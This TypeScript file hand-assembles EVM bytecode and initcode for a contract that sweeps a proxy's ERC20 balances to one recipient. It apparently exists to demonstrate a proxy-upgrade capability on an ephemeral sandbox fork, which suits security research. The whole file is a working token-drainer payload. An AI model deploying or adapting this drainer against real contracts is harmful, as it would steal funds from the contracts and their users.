/**
 * A minimal "sweep these ERC20s to one address" contract, assembled as raw EVM
 * bytecode in TypeScript — no Solidity source, no solc, no forge. It exists only
 * to make the CODE_CHANGE capability CONCRETE on a sandbox fork: once the
 * resolved admin upgrades a proxy to this implementation, any call to the proxy
 * delegatecalls here and the proxy's own token holdings move.
 *
 * The runtime ignores calldata and, for each configured token, executes
 * `balanceOf(address(this))` then `transfer(recipient, balance)`. Under
 * delegatecall from the proxy, `address(this)` IS the proxy, so it reads and
 * moves the proxy's balances. Deliberately the smallest thing that demonstrates
 * the capability — not a general-purpose exploit, and never deployed anywhere
 * but an ephemeral fork.
 *
 * Assembling it by hand keeps the codebase in one language and the bytecode
 * auditable inline; every opcode is commented at the sequence level in `drainOne`.
 */
import type { Hex } from "viem";

function byte(n: number): string {
  return n.toString(16).padStart(2, "0");
}

/** PUSHn of a raw hex immediate (no 0x). n is inferred from length; 1..32 bytes. */
function push(hexNo0x: string): string {
  const len = hexNo0x.length / 2;
  if (!Number.isInteger(len) || len < 1 || len > 32) throw new Error(`push: bad immediate length ${hexNo0x}`);
  return byte(0x5f + len) + hexNo0x; // 0x60 == PUSH1
}

const OP = {
  MSTORE: "52",
  MLOAD: "51",
  ADDRESS: "30",
  GAS: "5a",
  POP: "50",
  STATICCALL: "fa",
  CALL: "f1",
  SHL: "1b",
  STOP: "00",
} as const;

function strip0x(a: Hex): string {
  const s = a.toLowerCase().replace(/^0x/, "");
  if (s.length !== 40) throw new Error(`expected 20-byte address, got ${a}`);
  return s;
}

/** balanceOf(this) then transfer(recipient, thatBalance) against one token. */
function drainOne(token: Hex, recipient: Hex): string {
  const t = strip0x(token);
  const r = strip0x(recipient);
  let c = "";
  // --- balanceOf(address(this)) -> mem[0x00..0x20] ---
  c += push("70a08231") + push("e0") + OP.SHL + push("00") + OP.MSTORE; // selector<<224 at mem[0x00]
  c += OP.ADDRESS + push("04") + OP.MSTORE; // address(this) at mem[0x04] (left-padded to 32B)
  // staticcall(gas, token, in=0x00 len=0x24, out=0x00 len=0x20); ignore success (demo)
  c += push("20") + push("00") + push("24") + push("00") + push(t) + OP.GAS + OP.STATICCALL + OP.POP;
  // --- transfer(recipient, balance) ---
  c += push("00") + OP.MLOAD; // stack: [balance]
  c += push("a9059cbb") + push("e0") + OP.SHL + push("00") + OP.MSTORE; // transfer selector at mem[0x00]
  c += push(r) + push("04") + OP.MSTORE; // recipient at mem[0x04]
  c += push("24") + OP.MSTORE; // balance (from stack) at mem[0x24]
  // call(gas, token, value=0, in=0x00 len=0x44, out=0x00 len=0x00); ignore success
  c += push("00") + push("00") + push("44") + push("00") + push("00") + push(t) + OP.GAS + OP.CALL + OP.POP;
  return c;
}

/** The runtime bytecode: drain each token in order, then STOP. */
export function drainerRuntime(tokens: Hex[], recipient: Hex): Hex {
  const body = tokens.map((t) => drainOne(t, recipient)).join("") + OP.STOP;
  return ("0x" + body) as Hex;
}

/**
 * Deployment initcode that returns the runtime above. Standard constructor:
 *   PUSH2 len; PUSH1 <prefixLen>; PUSH1 0x00; CODECOPY; PUSH2 len; PUSH1 0x00; RETURN
 * The prefix is 14 bytes long, so CODECOPY's code offset is 0x0e.
 */
export function drainerInitcode(tokens: Hex[], recipient: Hex): Hex {
  const runtime = drainerRuntime(tokens, recipient).slice(2);
  const len = runtime.length / 2;
  if (len > 0xffff) throw new Error("drainer runtime too large for PUSH2 length");
  const lenHex = len.toString(16).padStart(4, "0");
  const prefix =
    "61" + lenHex + // PUSH2 len
    "60" + "0e" + // PUSH1 0x0e (prefix length == code offset of runtime)
    "60" + "00" + // PUSH1 0x00
    "39" + // CODECOPY
    "61" + lenHex + // PUSH2 len
    "60" + "00" + // PUSH1 0x00
    "f3"; // RETURN
  return ("0x" + prefix + runtime) as Hex;
}
